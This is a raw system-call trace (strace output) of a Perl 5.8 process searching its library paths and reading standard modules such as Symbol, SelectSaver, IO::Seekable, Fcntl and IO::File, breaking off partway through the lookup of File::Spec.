5839  07:10:58.125573 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125585 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125598 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125611 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
5839  07:10:58.125631 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.125646 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.125657 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.125674 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
5839  07:10:58.126121 read(8, "", 4096) = 0
5839  07:10:58.126138 close(8)          = 0
5839  07:10:58.126201 stat64("/etc/perl/SelectSaver.pmc",  <unfinished ...>
5837  07:10:58.126219 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5837  07:10:58.126240 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5837  07:10:58.126255 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5837  07:10:58.126265 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5837  07:10:58.126277 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5837  07:10:58.126291 waitpid(-1,  <unfinished ...>
5839  07:10:58.126301 <... stat64 resumed> 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126308 stat64("/etc/perl/SelectSaver.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126323 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126336 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126350 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126375 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126419 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126432 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126462 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126474 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126488 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126500 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126515 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.126527 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
5839  07:10:58.126548 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.126563 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.126574 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.126593 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
5839  07:10:58.126723 brk(0x81d6000)    = 0x81d6000
5839  07:10:58.126753 read(8, "", 4096) = 0
5839  07:10:58.126764 close(8)          = 0
5839  07:10:58.127255 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
5839  07:10:58.128045 read(6, "", 4096) = 0
5839  07:10:58.128065 close(6)          = 0
5839  07:10:58.128105 stat64("/etc/perl/IO/Seekable.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128121 stat64("/etc/perl/IO/Seekable.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128135 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128148 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128162 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128175 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128189 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128201 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128214 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128226 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128240 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.128253 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
5839  07:10:58.128274 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.128289 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.128301 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.128319 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
5839  07:10:58.128505 stat64("/etc/perl/Fcntl.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128520 stat64("/etc/perl/Fcntl.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128534 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128546 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128560 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128572 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128586 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128597 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128610 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128622 stat64("/usr/share/perl5/Fcntl.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128635 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.128646 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
5839  07:10:58.128667 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.128681 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.128692 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.128714 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
5839  07:10:58.129124 brk(0x81f7000)    = 0x81f7000
5839  07:10:58.129299 read(8, "", 4096) = 0
5839  07:10:58.129314 close(8)          = 0
5839  07:10:58.129418 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5839  07:10:58.139854 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5839  07:10:58.139854 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
5839  07:10:58.139854 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
5839  07:10:58.139854 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5839  07:10:58.139855 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7dc0000
5839  07:10:58.139855 mmap2(0xb7dc3000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7dc3000
5839  07:10:58.139855 close(8)          = 0
5839  07:10:58.139960 read(6, "", 4096) = 0
5839  07:10:58.139992 close(6)          = 0
5839  07:10:58.140041 stat64("/etc/perl/IO/File.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140056 stat64("/etc/perl/IO/File.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140070 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140083 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140097 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140109 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140123 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140134 stat64("/usr/lib/perl5/IO/File.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140147 stat64("/usr/share/perl5/IO/File.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140159 stat64("/usr/share/perl5/IO/File.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140172 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.140185 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
5839  07:10:58.140206 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.140220 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.140232 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.140249 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
5839  07:10:58.140546 stat64("/etc/perl/File/Spec.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149572 stat64("/etc/perl/File/Spec.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149572 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149572 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.149576 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
